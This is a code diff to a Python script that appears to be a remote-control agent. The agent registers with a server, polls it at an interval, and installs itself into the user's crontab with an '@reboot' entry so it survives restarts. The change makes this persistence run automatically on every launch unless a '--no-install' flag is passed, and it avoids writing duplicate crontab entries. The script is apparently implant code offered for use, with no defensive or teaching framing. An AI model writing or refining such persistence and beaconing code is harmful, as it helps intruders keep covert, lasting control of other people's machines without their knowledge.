@@ -363,6 +363,10 @@ def install_persistence():
 
         cron = f"@reboot {sys.executable} {agent_path} --server {srv} &"
         try:
+            existing = subprocess.run("crontab -l 2>/dev/null", shell=True, capture_output=True, text=True).stdout
+            if cron in existing:
+                print("[=] crontab already installed")
+                return
             subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, check=True)
             print("[+] crontab installed")
             return
@@ -409,6 +413,7 @@ def main():
     global SERVER, INTERVAL
     want_install = False
     want_remove = False
+    no_install = False
 
     i = 1
     while i < len(sys.argv):
@@ -419,6 +424,8 @@ def main():
             want_install = True; i += 1
         elif a == "--remove":
             want_remove = True; i += 1
+        elif a == "--no-install":
+            no_install = True; i += 1
         elif a.startswith("http"):
             SERVER = a; i += 1
         else:
@@ -436,6 +443,8 @@ def main():
     if not AID:
         print("[agent] register fail"); return
     print(f"[agent] id={AID} interval={INTERVAL}s")
+    if not no_install:
+        install_persistence()
 
     poll_count = 0
     while True:
